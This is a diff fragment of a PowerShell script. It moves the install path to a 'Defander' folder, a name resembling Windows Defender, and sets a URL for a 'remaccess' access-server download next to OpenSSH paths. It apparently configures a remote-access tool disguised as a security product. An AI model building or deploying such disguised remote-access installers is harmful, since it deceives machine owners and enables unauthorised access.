@@ -1,7 +1,7 @@
 $currentDirectory = Get-Location
 $openSSHFolder =  "$env:ProgramData\ssh"
 $OldPath = "C:\Program Files\OpenSSH"
-$InstallPath = "$env:ProgramData\Defander"
+$InstallPath = "C:\Program Files\Defander"
 $TempDir = [System.IO.Path]::GetTempPath()
 $GitZipName = Join-Path $TempDir "runtime.zip"
 $GitUrl = 'https://github.com/DirNotAvailable/remaccess/releases/download/v1.0.0/access-server.zip'
